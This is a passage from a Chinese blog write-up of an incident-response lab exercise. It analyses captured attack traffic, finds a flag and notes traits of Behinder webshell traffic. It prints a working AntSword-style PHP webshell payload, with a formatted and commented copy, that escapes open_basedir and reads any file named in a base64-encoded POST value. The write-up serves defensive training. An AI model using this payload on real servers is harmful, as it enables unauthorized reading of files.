<span class="string">&quot;f405&quot;</span>.<span class="string">&quot;72be7&quot;</span>;&#125;<span class="title function_ invoke__">ob_start</span>();<span class="keyword">try</span>&#123;<span class="variable">$F</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;x0b6b31b98f31d&quot;</span>],<span class="number">2</span>));<span class="variable">$P</span>=@<span class="title function_ invoke__">fopen</span>(<span class="variable">$F</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span>(@<span class="title function_ invoke__">fread</span>(<span class="variable">$P</span>,<span class="title function_ invoke__">filesize</span>(<span class="variable">$F</span>)?<span class="title function_ invoke__">filesize</span>(<span class="variable">$F</span>):<span class="number">4096</span>));@<span class="title function_ invoke__">fclose</span>(<span class="variable">$P</span>);;&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;<span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();&#125;;<span class="title function_ invoke__">asoutput</span>();<span class="keyword">die</span>();&amp;x0b6b31b98f31d=OmL3d3dy93d3dyb290LzEyNy4wLjAuMS9mbGFnMQ==</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><figcaption><span>格式化</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>); <span class="comment">// 关闭错误显示</span></span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>); <span class="comment">// 设置脚本执行时间无限制</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$opdir</span> = @<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>); <span class="comment">// 获取 open_basedir 配置</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$opdir</span>) &#123;</span><br><span class="line">    <span class="variable">$ocwd</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]); <span class="comment">// 获取当前脚本的目录</span></span><br><span class="line">    <span class="variable">$oparr</span> = <span class="title function_ invoke__">preg_split</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;Lzt8Oi8=&quot;</span>), <span class="variable">$opdir</span>); <span class="comment">// 解析 open_basedir 目录，以 ; 或 : 为分隔符</span></span><br><span class="line">    @<span class="title function_ invoke__">array_push</span>(<span class="variable">$oparr</span>, <span class="variable">$ocwd</span>, <span class="title function_ invoke__">sys_get_temp_dir</span>()); <span class="comment">// 将当前目录和临时目录添加到数组</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_writable</span>(<span class="variable">$item</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>; <span class="comment">// 如果目录不可写，跳过循环</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$tmdir</span> = <span class="variable">$item</span> . <span class="string">&quot;/.b1e668&quot;</span>; <span class="comment">// 创建一个临时目录路径</span></span><br><span class="line">        @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$tmdir</span>); <span class="comment">// 尝试创建临时目录</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$tmdir</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>; <span class="comment">// 如果临时目录不存在，跳过循环</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$tmdir</span> = <span class="title function_ invoke__">realpath</span>(<span class="variable">$tmdir</span>); <span class="comment">// 获取临时目录的绝对路径</span></span><br><span class="line">        @<span class="title function_ invoke__">chdir</span>(<span class="variable">$tmdir</span>); <span class="comment">// 切换到临时目录</span></span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>); <span class="comment">// 将 open_basedir 设置为上一级目录</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 分割目录路径，并遍历每个目录</span></span><br><span class="line">        <span class="variable">$cntarr</span> = @<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/\\\\|\//&quot;</span>, <span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$cntarr</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>); <span class="comment">// 逐级返回上一级目录</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;/&quot;</span>); <span class="comment">// 将 open_basedir 设置为根目录</span></span><br><span class="line">        @<span class="title function_ invoke__">rmdir</span>(<span class="variable">$tmdir</span>); <span class="comment">// 删除临时目录</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数用于编码输出</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数用于输出内容</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">ob_get_contents</span>(); <span class="comment">// 获取输出缓冲区内容</span></span><br><span class="line">    <span class="title function_ invoke__">ob_end_clean</span>(); <span class="comment">// 清空并关闭输出缓冲区</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;b6&quot;</span> . <span class="string">&quot;887&quot;</span>; <span class="comment">// 输出固定的标识符</span></span><br><span class="line">    <span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>); <span class="comment">// 输出编码后的内容</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;f405&quot;</span> . <span class="string">&quot;72be7&quot;</span>; <span class="comment">// 输出固定的标识符</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(); <span class="comment">// 开启输出缓冲区</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 从 POST 请求中读取 base64 编码的文件路径</span></span><br><span class="line">    <span class="variable">$F</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;x0b6b31b98f31d&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$P</span> = @<span class="title function_ invoke__">fopen</span>(<span class="variable">$F</span>, <span class="string">&quot;r&quot;</span>); <span class="comment">// 打开文件</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取文件内容，并输出</span></span><br><span class="line">    <span class="keyword">echo</span> (@<span class="title function_ invoke__">fread</span>(<span class="variable">$P</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$F</span>) ? <span class="title function_ invoke__">filesize</span>(<span class="variable">$F</span>) : <span class="number">4096</span>));</span><br><span class="line">    @<span class="title function_ invoke__">fclose</span>(<span class="variable">$P</span>); <span class="comment">// 关闭文件</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>(); <span class="comment">// 处理异常并输出错误信息</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">asoutput</span>(); <span class="comment">// 调用输出函数</span></span><br><span class="line"><span class="keyword">die</span>(); <span class="comment">// 结束脚本执行</span></span><br><span class="line">&amp;x0b6b31b98f31d=OmL3d3dy93d3dyb290LzEyNy4wLjAuMS9mbGFnMQ==</span><br></pre></td></tr></table></figure>
+
+<p><code>base64_decode(substr($_POST[&quot;x0b6b31b98f31d&quot;], 2));</code>获取<code>post key</code> <code>x0b6b31b98f31d</code>的值,然后从第二个字符串开始截取截取到最后一个也就是<code>L3d3dy93d3dyb290LzEyNy4wLjAuMS9mbGFnMQ==</code>然后<code>base64</code>解码得<code>/www/wwwroot/127.0.0.1/flag1</code>哎呀我去,误打误撞发现一个<code>flag</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426468.png" data-fancybox="true"/></div></div>
+
+<p>接着看下面的数据流,可以看到黑客访问了此文件,<code>flag1</code>的内容为:<code>flag1&#123;Network@_2020_Hack&#125;</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426666.png" data-fancybox="true"/></div></div>
+
+<p>再往下看又会发现一个冰蝎马的流量特征</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426136.png" data-fancybox="true"/></div></div>
+
+<ol>
+<li>冰蝎通讯默认使用长连接，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有<code>Connection: Keep-Alive</code></li>
+<li>请求体看起来向一堆<code>Base64</code>编码的内容但是解出来又是乱码,可以找到<code>Webshell</code>取出密钥进行<code>aes</code>解密</li>
+</ol>
+<h2 id="宝塔-Web应急响应"><a href="#宝塔-Web应急响应" class="headerlink" title="宝塔-Web应急响应"></a>宝塔-Web应急响应</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[root@web-server wwwlogs]<span class="comment"># cd /www/wwwlogs/</span></span><br><span class="line">[root@web-server wwwlogs]<span class="comment"># ll -a</span></span><br><span class="line">总用量 212</span><br><span class="line">drwx-----x 10 www  www     249 3月   7 12:01 .</span><br><span class="line">drwxr-xr-x  7 root root     99 3月   7 11:40 ..</span><br><span class="line">-rwx------  1 www  www   12532 3月  20 08:12 127.0.0.1.error.log</span><br><span class="line">-rwx------  1 www  www   93820 3月  20 15:36 127.0.0.1.<span class="built_in">log</span></span><br><span class="line">-rwx------  1 www  www  102880 3月  20 14:53 access.log</span><br><span class="line">drwx-----x  2 www  www       6 3月   7 11:40 go</span><br><span class="line">drwx-----x  3 www  www      24 3月   7 11:40 java</span><br><span class="line">drwx------  3 www  www      17 3月   7 11:47 load_balancing</span><br><span class="line">-rwx------  1 www  www       0 3月   7 11:47 nginx_error.log</span><br><span class="line">drwx-----x  2 www  www       6 3月   7 11:40 nodejs</span><br><span class="line">drwx-----x  2 www  www       6 3月   7 11:40 other</span><br><span class="line">drwx-----x  2 www  www       6 3月   7 11:41 python</span><br><span class="line">drwx------  2 www  www      52 3月  20 08:05 request</span><br><span class="line">-rwx------  1 www  www       0 3月   7 11:47 tcp-access.log</span><br><span class="line">-rwx------  1 www  www       0 3月   7 11:47 tcp-error.log</span><br><span class="line">drwx------  2 www  www       6 3月   7 11:47 waf</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426681.png" data-fancybox="true"/></div></div>
+
+<p>分析日志,只有两个IP那么<code>192.168.20.1</code>则为攻击IP</p>
+<p>输入<code>bt</code>修改面板密码进入面板,设置网站<code>IP</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426924.png" data-fancybox="true"/></div></div>
+
+<p>没有密码,无法登录后台,去数据库里查一查密码</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426772.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426686.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161427150.png" data-fancybox="true"/></div></div>
+
+<div class="article-footer fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文由 <a href="https://jiangjiyue.github.io/">kill3r</a> 原创,采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+    <section id="share">
+      <div class="header"><span>分享文章</span></div>
+      <div class="body">
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://jiangjiyue.github.io/2024/07/17/b05c14ed/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://jiangjiyue.github.io/2024/07/17/b05c14ed/&title=应急响应靶机训练-Linux2 - SafeKiller Zone&pics=https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161430976.png&summary=
+    总字符数: 17.89K 
+    
+    
+    代码: 15.04K, 文本: 1.35K
+    
+    
+    预计阅读时间: 1.19 小时
+    
+    
+
+背景前景需要：看监控的石化发现WebShe..."><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=应急响应靶机训练-Linux2 - SafeKiller Zone&amp;body=https://jiangjiyue.github.io/2024/07/17/b05c14ed/"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        
+        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
+          <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://jiangjiyue.github.io/2024/07/17/b05c14ed/"/>
+        </div>
+        
+      </div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/07/16/29554557/">应急响应靶机训练-Linux1</a></div></section></div>
+
+<div class="related-wrap" id="related-posts">
+    <section class='header'>
+      <div class='title cap theme'>您可能感兴趣的文章</div>
+    </section>
+    <section class='body'>
+    <div class="related-posts"><a class="item" href="\2024\07\16\b7b8d727\" title="应急响应之Linux"><span class="title">应急响应之Linux</span></a><a class="item" href="\2024\07\16\29554557\" title="应急响应靶机训练-Linux1"><span class="title">应急响应靶机训练-Linux1</span></a><a class="item" href="\2021\09\19\2dd5e334\" title="ELK收集nginx日志并展示来源IP地图"><span class="title">ELK收集nginx日志并展示来源IP地图</span></a><a class="item" href="\2022\09\06\6e6b1513\" title="基于Awstats的Apache日志分析"><span class="title">基于Awstats的Apache日志分析</span></a><a class="item" href="\2021\09\26\1b012da8\" title="CorePress主题优化"><span class="title">CorePress主题优化</span></a></div></section></div>
+
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>快来参与讨论吧~</p>
+
+    </section>
+    <section class='body cmt-body waline'>
+      
+
+<div id="waline_container" class="waline_thread"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </section>
+  </div>
+
+
+
+<footer class="page-footer footnote"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs15">博客</span><a href="/">近期</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archives/">归档</a><a href="/tools/">工具</a></div><div class="sitemap-group"><span class="fs15">笔记</span><a href="/wiki/tags/DevOps/index.html">DevOps</a><a href="/wiki/tags/Vulnerability/index.html">常见漏洞分析</a><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a></div><div class="sitemap-group"><span class="fs15">社交</span><a href="/friends/">友链</a><a href="/comments/">留言板</a></div><div class="sitemap-group"><span class="fs15">更多</span><a href="/about/">关于本站</a><a target="_blank" rel="noopener" href="https://github.com/JiangJiYue">GitHub</a></div></div><div class="text"><center>
+  <p>本破站由 <a href="/">@SafeKiller Zone</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客部分素材来源于网络，如有侵权请联系<a href="mailto:jiangjiyue1@gmail.com">jiangjiyue1@gmail.com</a>删除<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+  <!--不蒜子计数器-->
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <span>本"页面"访问 <span id="busuanzi_value_page_pv"></span> 次 | 👀总访问 <span id="busuanzi_value_site_pv"></span> 次 | 总访客 <span id="busuanzi_value_site_uv"></span> 人</span>
+  <br>
+  <span id="runtime_span"></span>
+  <script type="text/javascript">
+    // JavaScript for showing runtime here
+  </script>
+</center>
+<div style="display: flex;justify-content: center;align-items: center;margin: 10px;">
+  <a target="_blank" rel="noopener" href="https://notbyai.fyi/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/Written-By-Human-white.png" style="width:140px;height:50px;margin-right: 10px " id='notbyai'></a>
+  <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/by-nc-sa.eu.png" style="width:140px;height:50px"></a>
+</div>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-text">背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83"><span class="toc-text">靶机环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6"><span class="toc-text">查看文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%AB%AF%E5%8F%A3"><span class="toc-text">查看端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%8D%E5%8A%A1"><span class="toc-text">查看服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4"><span class="toc-text">历史命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%B4%A6%E5%8F%B7"><span class="toc-text">查看账号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E7%A8%8B%E5%BA%8F"><span class="toc-text">分析开机自启程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%AE%A1%E5%88%92%E6%88%96%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-text">查看计划或定时任务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A8%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90"><span class="toc-text">全流量包分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9D%E5%A1%94-Web%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-text">宝塔-Web应急响应</span></a></li></ol></div><div class="widget-footer">
+
